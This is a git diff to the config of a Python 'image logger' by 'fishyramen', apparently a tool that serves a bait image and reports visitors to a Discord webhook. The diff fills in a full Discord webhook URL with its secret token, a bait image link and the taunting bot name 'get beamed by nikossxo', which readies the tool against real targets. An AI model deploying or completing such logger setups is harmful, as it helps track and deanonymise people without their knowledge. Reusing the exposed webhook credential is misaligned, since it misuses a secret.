@@ -14,13 +14,13 @@ __author__ = "fishyramen"
 
 config = {
     # BASE CONFIG #
-    "webhook": "webhook goes here",
-    "image": "image goes here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1545716949072478218/0jmphCGZkr2ezEFVOz-aPoLfQ_pkLhk0ENTN3h7D-cqacgHoFQiHtkO-0yLGlDBERVHv",
+    "image": "https://tcmhuxevcnxpxpubnhkm.supabase.co/storage/v1/object/public/memes/memes/2026/05/12/custom-upload-son-1778634282482.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "snatch blue", # Set this to the name you want the webhook to have
+    "username": "get beamed by nikossxo", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
